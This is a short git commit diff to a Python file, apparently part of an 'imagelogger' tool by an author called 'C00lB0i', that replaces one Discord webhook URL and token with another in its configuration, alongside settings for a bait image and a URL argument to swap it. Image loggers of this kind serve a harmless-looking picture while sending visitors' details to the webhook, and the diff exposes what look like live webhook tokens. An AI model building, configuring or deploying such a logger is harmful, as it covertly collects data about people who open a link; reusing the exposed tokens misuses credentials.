27079cfd7299c2b026c0b2d7c7558fe691e007eb
⭐️—_—💧 <papaspapasoti@gmail.com>
2025-06-23 18:27:11 +0300

    Update image2.py

--- api/image2.py
+++ api/image2.py
@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1386517547129503784/H7Y_Af2SiwqmPTzmsBRpZmQwCiEj5hjpf0FNVUl0WavinXJRTNpZSnqREViEWNV0QPxZ",
+    "webhook": "https://discord.com/api/webhooks/1058074536932806756/tHxpd1B4toTe9O--IKfNp_nQYwmw_kvM5SlbKJybPJOjWxQ5HTm5uUyOvrxhFlN7l2rz",
     "image": "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
